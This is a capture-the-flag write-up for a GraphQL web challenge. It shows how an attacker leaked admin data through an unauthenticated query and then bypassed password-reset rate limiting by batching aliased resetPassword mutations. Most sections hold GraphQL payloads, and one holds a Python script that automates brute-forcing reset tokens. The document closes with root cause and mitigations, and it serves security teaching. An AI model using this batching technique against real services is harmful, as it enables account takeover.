# Overgrowth — HI Cyber Con 2026

**Category:** Web Exploitation  
**Technology:** Flask, Ariadne GraphQL  
**Vulnerability:** GraphQL Alias Batching / Rate-Limit Bypass  
**Status:** Solved  
**Flag Format:** `hiCTF{...}`

## 1. Challenge Overview

Overgrowth was a gardening supply website powered by a GraphQL API. The challenge hinted that the "head gardener" had access to information unavailable to regular users.

Our objective was to obtain the protected flag accessible only to the administrator.

The GraphQL endpoint was:

```text
POST /graphql
```

## 2. GraphQL Reconnaissance

Visiting `/graphql` displayed an Ariadne GraphiQL interface.

We initially attempted GraphQL introspection using `__schema`, but introspection was disabled.

Instead, we used GraphQL validation errors to enumerate available queries, mutations, and object fields.

We discovered four queries:

```graphql
type Query {
  products: [Product!]
  user(username: String!): User
  me: User
  flag: String
}
```

And three mutations:

```graphql
type Mutation {
  login(username: String!, password: String!): AuthPayload
  requestPasswordReset(username: String!): Boolean!
  resetPassword(
    username: String!
    token: String!
    newPassword: String!
  ): Boolean!
}
```

These are simplified representations reconstructed from the observed API behavior.

## 3. Information Disclosure

The `user` query was accessible without authentication.

We executed:

```graphql
query {
  user(username: "admin") {
    id
    username
    email
    role
    apiKey
  }
}
```

The server responded with:

```json
{
  "data": {
    "user": {
      "id": "1",
      "username": "admin",
      "email": "admin@overgrowth.ctf",
      "role": "admin",
      "apiKey": "hiCTF{n0t_the_flag_keep_diggin_this_is_just_an_apikey}"
    }
  }
}
```

The exposed API key resembled a flag but was intentionally a decoy.

We also confirmed that accessing the real `flag` field without authentication returned:

```json
{
  "data": {
    "flag": null
  },
  "errors": [
    {
      "message": "authentication required: log in first"
    }
  ]
}
```

Therefore, we needed to authenticate as the administrator.

## 4. Discovering Password Reset

Further GraphQL enumeration revealed the following mutation:

```graphql
mutation {
  requestPasswordReset(username: "admin")
}
```

The server returned:

```json
{
  "data": {
    "requestPasswordReset": true
  }
}
```

We also discovered that password resets could be completed using a token:

```graphql
mutation {
  resetPassword(
    username: "admin"
    token: "1234"
    newPassword: "NewPassword123!"
  )
}
```

For an invalid token, the server returned `false`.

This established password recovery as a possible route to administrator access.

## 5. Encountering Rate Limiting

While testing recovery-token candidates individually, the application eventually responded with:

```text
HTTP 429
rate limit: too many password reset attempts; slow down
```

The server restricted repeated password-reset attempts, preventing straightforward token enumeration through separate HTTP requests.

However, GraphQL has a feature called **aliases**, which allows multiple calls to the same resolver in a single operation.

This became the key to the exploit.

## 6. GraphQL Alias Batching

Instead of sending separate HTTP requests, we could execute multiple password-reset attempts in one GraphQL mutation.

Example:

```graphql
mutation {
  a: resetPassword(
    username: "admin"
    token: "0000"
    newPassword: "NewPassword123!"
  )

  b: resetPassword(
    username: "admin"
    token: "0001"
    newPassword: "NewPassword123!"
  )

  c: resetPassword(
    username: "admin"
    token: "0002"
    newPassword: "NewPassword123!"
  )
}
```

The server evaluated each alias independently and returned a separate result.

We verified this behavior with 14 invalid reset-token attempts in a single HTTP request.

All aliases executed successfully, each returning `false`.

## 7. Verifying the Rate-Limit Weakness

To determine whether aliasing affected rate limiting, we performed the following test:

1. Send one invalid reset attempt normally.
2. Send 14 invalid attempts using GraphQL aliases.
3. Send another 14 invalid attempts using aliases.
4. Send one more invalid attempt normally.

All 30 attempts were evaluated, without HTTP 429 responses.

This was strong evidence that the server's rate-limiting protection did not properly account for the number of sensitive resolver executions inside an HTTP request.

In other words, the application allowed many password-reset validations to be bundled into relatively few requests.

## 8. Automating the Attack

We automated the GraphQL alias technique using Python.

The approach was to generate multiple reset-token candidates, build one GraphQL mutation containing many aliases, and inspect the results.

A simplified version of the batching logic:

```python
import requests

URL = "https://TARGET/graphql"

def check_batch(codes, password):
    fields = []

    for i, code in enumerate(codes):
        fields.append(
            f'''
            c{i}: resetPassword(
                username: "admin"
                token: "{code}"
                newPassword: "{password}"
            )
            '''
        )

    query = "mutation {\n" + "\n".join(fields) + "\n}"

    response = requests.post(
        URL,
        json={"query": query},
        timeout=30
    )

    response.raise_for_status()
    return response.json()
```

We used this technique to test candidate tokens in batches rather than issuing a separate HTTP request for every attempt.

A successful reset can be identified by an alias returning `true`.

## 9. Administrator Authentication

After obtaining a successful password reset, the next step was to authenticate using the updated credentials.

```graphql
mutation {
  login(
    username: "admin"
    password: "NewPassword123!"
  ) {
    token
    user {
      id
      username
      role
    }
  }
}
```

The authenticated session could then be used to access the protected GraphQL query:

```graphql
query {
  me {
    username
    role
  }
  flag
}
```

This completed the intended access path to the flag.

## 10. Root Cause

The central weakness involved the interaction between GraphQL aliases and password-reset rate limiting.

GraphQL permits multiple resolver executions within a single HTTP request. If rate limiting is enforced only at the request boundary, an attacker can multiply the number of sensitive operations performed while consuming comparatively few request allowances.

The challenge also demonstrated the risks of exposing administrator account metadata and API keys through unauthenticated GraphQL queries.

Appropriate mitigations include limiting GraphQL alias counts and query complexity, enforcing rate limits for each sensitive resolver invocation, using sufficiently unpredictable reset tokens, and restricting access to sensitive user fields.

## 11. Conclusion

Overgrowth demonstrated how GraphQL's flexibility can undermine security controls that were designed around traditional HTTP request patterns.

The investigation involved:

- Enumerating a GraphQL schema with introspection disabled.
- Discovering an unauthenticated user-information disclosure.
- Identifying the administrator password-reset workflow.
- Observing password-reset rate limiting.
- Exploiting GraphQL aliases to batch recovery-token attempts.
- Using the recovered administrative access to retrieve the protected flag.

**Final result: Challenge solved.**

**Flag:** Recovered; value omitted from this write-up.
